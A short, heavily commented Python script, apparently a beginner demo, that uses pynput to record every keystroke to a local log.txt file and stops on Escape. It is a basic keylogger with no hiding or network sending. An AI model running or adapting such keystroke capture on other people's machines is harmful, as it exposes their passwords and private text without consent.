# Importing necessary classes from the pynput.keyboard module
from pynput.keyboard import Key, Listener

# List to store pressed keys
keys = []

# Function called when a key is pressed
def on_press(key):
    keys.append(key)  # Append the pressed key to the keys list
    write_file(keys)  # Call the write_file function to write the keys to a file

    try:
        print('Alphanumeric key {0} pressed'.format(key.char))  # Print the pressed alphanumeric key
    except AttributeError:
        print('Special key {0} pressed'.format(key))  # Print the pressed special key


# Function to write the pressed keys to a file
def write_file(keys):
    with open('log.txt', 'w') as f:  # Open the file 'log.txt' in write mode
        for key in keys:  # Iterate over the keys in the keys list
            k = str(key).replace("'", "")  # Convert the key to a string and remove single quotes
            f.write(k)  # Write the key to the file
            f.write(' ')  # Write a space after each key for readability


# Function called when a key is released
def on_release(key):
    print('{0} released'.format(key))  # Print the released key
    if key == Key.esc:  # Check if the released key is the escape key
        return False  # Stop the listener


# Create a keyboard listener with specified event handlers
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()  # Start listening for keyboard events
